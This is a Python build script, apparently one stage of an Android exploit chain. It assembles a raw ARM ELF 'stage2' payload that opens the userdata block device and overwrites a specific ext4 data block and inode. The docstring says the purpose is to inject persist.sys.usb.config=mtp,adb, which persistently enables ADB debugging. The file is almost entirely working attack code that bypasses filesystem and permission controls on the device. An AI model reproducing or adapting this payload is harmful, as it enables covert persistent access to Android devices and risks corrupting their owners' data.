"""Payload inject_properties: injects persist.sys.usb.config=mtp,adb into:
1. Data block 519807 (4096 bytes)
2. Inode 57459 at block 229603, offset 512 (256 bytes, updated size=1307)
"""

import os
import struct
from keystone import keystone as K

BASE = 0x400000
ENTRY = BASE + 0x100
BS = 4096

HERE = os.path.dirname(os.path.abspath(__file__))

content_blk = open(os.path.join(HERE, 'oobe0_prop_block_519807.bin'), 'rb').read()
inode_data = open(os.path.join(HERE, 'patched_inode_57459.bin'), 'rb').read()

assert len(content_blk) == 4096
assert len(inode_data) == 256

LABELS = {
    'tag': '\n=== INJECT_PERSISTENT_PROPERTIES ===\n',
    'ud': '/dev/block/platform/bootdevice/by-name/userdata',
    's1': 'W_DATA_BLOCK_519807: ',
    's2': 'W_INODE_57459: ',
    'ok': 'OK\n',
    'end_msg': '=== PERSIST_PROPERTIES_INJECTED ===\n',
    'eacces': 'EACCES\n',
    'enoent': 'ENOENT\n',
    'eperm': 'EPERM\n',
    'einval': 'EINVAL\n',
    'eother': 'EOTHER\n',
}
ORDER = list(LABELS)
raw_hdr = b''.join(LABELS[k].encode() + b'\x00' for k in ORDER)
pad_hdr = (4 - (len(raw_hdr) % 4)) % 4
DATA_HDR = raw_hdr + (b'\x00' * pad_hdr)

OFFSET = {}
_p = 0
for _k in ORDER:
    OFFSET[_k] = _p
    _p += len(LABELS[_k].encode()) + 1


def movconst(reg, value):
    return '    movw {0}, #{1:#06x}\n    movt {0}, #{2:#06x}'.format(
        reg, value & 0xFFFF, (value >> 16) & 0xFFFF
    )


def make_source(addr_of, buf_content, buf_inode):
    def C(reg, name):
        return movconst(reg, addr_of(name))

    off_content = 519807 * BS
    off_inode = 229603 * BS + 512

    return """
_start:
    push {{r4, r5, r6, r7, lr}}

{tag}
    bl  puts

    // Open userdata O_RDWR (r1 = 2)
{ud}
    mov r1, #2
    bl  sys_open
    cmp r0, #0
    blt fail
    mov r5, r0

    // Step 1: write content block 519807
{s1}
    bl  puts
    sub sp, sp, #16
    mov r0, r5
    movw r1, #{c_hi_lo}
    movt r1, #{c_hi_hi}
    movw r2, #{c_lo_lo}
    movt r2, #{c_lo_hi}
    mov r3, sp
    mov r4, #0
    mov r7, #140
    svc #0
    add sp, sp, #16

    mov r0, r5
{buf_c}
    mov r2, #4096
    mov r7, #4
    svc #0
    cmp r0, #4096
    bne fail
{ok}
    bl  puts

    // Step 2: write Inode 57459 (256 bytes)
{s2}
    bl  puts
    sub sp, sp, #16
    mov r0, r5
    movw r1, #{ino_hi_lo}
    movt r1, #{ino_hi_hi}
    movw r2, #{ino_lo_lo}
    movt r2, #{ino_lo_hi}
    mov r3, sp
    mov r4, #0
    mov r7, #140
    svc #0
    add sp, sp, #16

    mov r0, r5
{buf_ino}
    mov r2, #256
    mov r7, #4
    svc #0
    cmp r0, #256
    bne fail
{ok}
    bl  puts

    // fsync(fd)
    mov r0, r5
    mov r7, #118
    svc #0

    // close(fd)
    mov r0, r5
    mov r7, #6
    svc #0

{end_msg}
    bl  puts
    mov r0, #0
    mov r7, #1
    svc #0

fail:
    bl  err_sym
    mov r0, #1
    mov r7, #1
    svc #0

sys_open:
    mov r2, #0
    mov r7, #5
    svc #0
    bx  lr

err_sym:
    push {{lr}}
    cmn r0, #13
    beq err_eacces
    cmn r0, #2
    beq err_enoent
    cmn r0, #1
    beq err_eperm
    cmn r0, #22
    beq err_einval
{eother}
    bl  puts
    pop {{pc}}
err_eacces:
{eacces}
    bl  puts
    pop {{pc}}
err_enoent:
{enoent}
    bl  puts
    pop {{pc}}
err_eperm:
{eperm}
    bl  puts
    pop {{pc}}
err_einval:
{einval}
    bl  puts
    pop {{pc}}

puts:
    mov r1, r0
    mov r2, #0
puts_loop:
    ldrb r3, [r1, r2]
    cmp r3, #0
    beq puts_done
    add r2, r2, #1
    b   puts_loop
puts_done:
    mov r0, #1
    mov r7, #4
    svc #0
    bx  lr
""".format(
        tag=C('r0', 'tag'),
        ud=C('r0', 'ud'),
        s1=C('r0', 's1'),
        s2=C('r0', 's2'),
        ok=C('r0', 'ok'),
        end_msg=C('r0', 'end_msg'),
        eacces=C('r0', 'eacces'),
        enoent=C('r0', 'enoent'),
        eperm=C('r0', 'eperm'),
        einval=C('r0', 'einval'),
        eother=C('r0', 'eother'),
        buf_c=movconst('r1', buf_content),
        buf_ino=movconst('r1', buf_inode),
        c_hi_lo=((off_content >> 32) & 0xFFFFFFFF) & 0xFFFF,
        c_hi_hi=(((off_content >> 32) & 0xFFFFFFFF) >> 16) & 0xFFFF,
        c_lo_lo=(off_content & 0xFFFFFFFF) & 0xFFFF,
        c_lo_hi=((off_content & 0xFFFFFFFF) >> 16) & 0xFFFF,
        ino_hi_lo=((off_inode >> 32) & 0xFFFFFFFF) & 0xFFFF,
        ino_hi_hi=(((off_inode >> 32) & 0xFFFFFFFF) >> 16) & 0xFFFF,
        ino_lo_lo=(off_inode & 0xFFFFFFFF) & 0xFFFF,
        ino_lo_hi=((off_inode & 0xFFFFFFFF) >> 16) & 0xFFFF,
    )


def build():
    ks = K.Ks(K.KS_ARCH_ARM, K.KS_MODE_ARM)
    code_pass1, _ = ks.asm(make_source(lambda n: BASE, BASE, BASE), ENTRY)
    code_len = len(bytes(code_pass1))
    hdr_data_at = ENTRY + code_len

    DATA_BUFFERS = content_blk + inode_data
    buf_content = hdr_data_at + len(DATA_HDR)
    buf_inode = buf_content + len(content_blk)

    assert (buf_content % 4) == 0, f"buf_content unaligned: {hex(buf_content)}"
    assert (buf_inode % 4) == 0, f"buf_inode unaligned: {hex(buf_inode)}"

    code_pass2, count = ks.asm(
        make_source(
            lambda n: hdr_data_at + OFFSET[n],
            buf_content,
            buf_inode,
        ),
        ENTRY,
    )
    code_pass2 = bytes(code_pass2)
    assert len(code_pass2) == code_len

    pad = ENTRY - BASE - 52 - 32
    blob = b'\x00' * pad + code_pass2 + DATA_HDR + DATA_BUFFERS
    # Ensure blob is 4-byte aligned
    if len(blob) % 4 != 0:
        blob += b'\x00' * (4 - (len(blob) % 4))

    filesz = 52 + 32 + len(blob)
    assert (filesz % 4) == 0, f"filesz unaligned: {filesz}"

    ident = b'\x7fELF' + bytes([1, 1, 1, 0]) + b'\x00' * 8
    ehdr = ident + struct.pack(
        '<HHIIIIIHHHHHH', 2, 40, 1, ENTRY, 52, 0, 0, 52, 32, 1, 0, 0, 0
    )
    phdr = struct.pack(
        '<IIIIIIII', 1, 0, BASE, BASE, filesz, filesz, 7, 0x1000
    )
    elf = ehdr + phdr + blob
    assert (len(elf) % 4) == 0, f"elf unaligned: {len(elf)}"

    out_path = os.path.join(HERE, 'stage2_inject_properties.elf')
    with open(out_path, 'wb') as fout:
        fout.write(elf)
    print(f'Generated {out_path} ({len(elf)} bytes, {count} instructions, 4-byte aligned)')


if __name__ == '__main__':
    build()
